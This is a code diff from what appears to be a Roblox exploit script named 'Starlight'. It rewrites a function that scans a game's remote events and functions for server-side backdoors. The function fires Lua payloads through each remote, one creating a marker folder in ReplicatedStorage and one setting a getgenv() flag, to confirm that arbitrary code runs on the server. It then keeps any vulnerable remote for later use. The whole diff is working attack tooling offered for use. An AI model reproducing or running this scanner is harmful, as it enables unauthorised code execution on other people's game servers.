@@ -2356,74 +2356,92 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		return true
 	end
 	
-	local function testRemote(remote, isFunction)
-		if foundExploit then return false end
-		if not isLikelyBackdoorRemote(remote) then return false end
 	
-		local modelName = "starlight_"..tostring(os.clock()):gsub("%.", "")
-		local rs = game:GetService("ReplicatedStorage")
-		local foundEvent = false
-	
-		local connection = rs.DescendantAdded:Connect(function(inst)
-			if inst.Name == modelName then
-				foundEvent = true
-			end
-		end)
-	
-		local function cleanup()
-			connection:Disconnect()
-			local f = rs:FindFirstChild(modelName)
-			if f then f:Destroy() end
-		end
-	
-		local success = pcall(function()
-			local payload = [[
-				local m=Instance.new("Folder")
-				m.Name="]]..modelName..[["
-				m.Parent=game:GetService("ReplicatedStorage")
-			]]
-		 task.spawn(function()
-		     pcall(function()
-			if isFunction then
-				if not remote:InvokeServer('starlightTSS', payload .. "\nreturn true") then 
-				    return remote:InvokeServer(payload .. "\nreturn true")
-				else
-				    return remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
-			        end
-			else
-				remote:FireServer(payload)
-			end
-		      end)
-		    end)
-		end)
 	
 		
-		local timeout = 1
-		local start = os.clock()
-		while os.clock() - start < timeout do
-			if foundEvent or rs:FindFirstChild(modelName) then
-				foundEvent = true
-				break
-			end
-			task.wait(0.001)
+	local function testRemote(remote, isFunction)
+	if foundExploit then return false end
+	if not isLikelyBackdoorRemote(remote) then return false end
+
+	local modelName = "starlight_" .. tostring(os.clock()):gsub("%.", "")
+	local rs = game:GetService("ReplicatedStorage")
+	local foundEvent = false
+	local testFlagName = "__backdoor_test_flag_" .. tostring(os.clock()):gsub("%.", "")
+	local globalPayload = "getgenv()." .. testFlagName .. " = true"
+
+	local connection = rs.DescendantAdded:Connect(function(inst)
+		if inst.Name == modelName then
+			foundEvent = true
 		end
-	
-		cleanup()
-	
-		if foundEvent and not foundExploit then
-			foundExploit = true
-			if isFunction then
-				remoteFunction = remote
-			else
-				remoteEvent = remote
-			end
-			return true
-		end
-	
-		return false
+	end)
+
+	local function cleanup()
+		connection:Disconnect()
+		local f = rs:FindFirstChild(modelName)
+		if f then f:Destroy() end
 	end
-	
-	
+
+	local success = pcall(function()
+		local payload = [[
+			local m=Instance.new("Folder")
+			m.Name="]] .. modelName .. [["
+			m.Parent=game:GetService("ReplicatedStorage")
+		]]
+
+		task.spawn(function()
+			pcall(function()
+				if isFunction then
+					local ran = false
+					pcall(function()
+						local r = remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
+						if r then ran = true end
+					end)
+					if not ran then
+						pcall(function()
+							local r = remote:InvokeServer(payload .. "\nreturn true")
+							if r then ran = true end
+						end)
+					end
+					pcall(function()
+						remote:InvokeServer(globalPayload)
+					end)
+				else
+					remote:FireServer(payload)
+					remote:FireServer(globalPayload)
+				end
+			end)
+		end)
+	end)
+
+	local timeout = 1
+	local start = os.clock()
+	while os.clock() - start < timeout do
+		if foundEvent or rs:FindFirstChild(modelName) then
+			foundEvent = true
+			break
+		end
+		task.wait(0.001)
+	end
+
+	local globalFlagTriggered = getgenv()[testFlagName] == true
+	if globalFlagTriggered then
+		getgenv()[testFlagName] = nil
+	end
+
+	cleanup()
+
+	if (foundEvent or globalFlagTriggered) and not foundExploit then
+		foundExploit = true
+		if isFunction then
+			remoteFunction = remote
+		else
+			remoteEvent = remote
+		end
+		return true
+	end
+
+	   return false
+	end
 	
 	local function findRemote()
 		local trueStart = os.clock()
